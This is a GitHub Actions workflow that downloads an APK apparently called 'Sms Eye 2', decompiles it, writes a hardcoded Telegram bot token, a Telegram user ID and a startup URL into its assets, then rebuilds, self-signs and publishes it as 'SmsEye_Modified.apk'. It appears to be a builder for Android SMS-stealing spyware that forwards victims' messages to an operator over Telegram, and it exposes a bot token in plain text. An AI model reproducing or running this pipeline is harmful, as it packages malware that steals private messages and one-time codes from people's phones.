name: Inject ID and URL into APK

on:
  workflow_dispatch:
    inputs:
      apk_url:
        description: 'Direct URL to base APK file (Sms Eye 2 APK)'
        required: true
      user_id:
        description: 'Telegram numeric user ID (for id.txt)'
        required: true
      app_url:
        description: 'Startup URL to inject in url.txt'
        required: true

jobs:
  patch-apk:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v3

    - name: Install dependencies
      run: |
        sudo apt update
        sudo apt install -y default-jdk wget zipalign
        wget https://github.com/iBotPeaches/Apktool/releases/latest/download/apktool_2.9.3.jar -O apktool.jar

    - name: Download APK
      run: |
        wget "${{ github.event.inputs.apk_url }}" -O base.apk

    - name: Decompile APK
      run: |
        java -jar apktool.jar d base.apk -o decoded_apk --force

    - name: Inject token, user ID, and startup URL
      run: |
        echo "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4" > decoded_apk/assets/token.txt
        echo "${{ github.event.inputs.user_id }}" > decoded_apk/assets/id.txt
        echo "${{ github.event.inputs.app_url }}" > decoded_apk/assets/url.txt

    - name: Rebuild APK
      run: |
        java -jar apktool.jar b decoded_apk -o unsigned.apk

    - name: Sign APK
      run: |
        keytool -genkey -v -keystore keystore.jks -storepass password -alias key0 -keypass password \
          -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=SmsEye"
        jarsigner -verbose -keystore keystore.jks -storepass password -keypass password unsigned.apk key0
        mv unsigned.apk SmsEye_Modified.apk

    - name: Upload Patched APK
      uses: actions/upload-artifact@v4
      with:
        name: SmsEye-Patched-APK
        path: SmsEye_Modified.apk
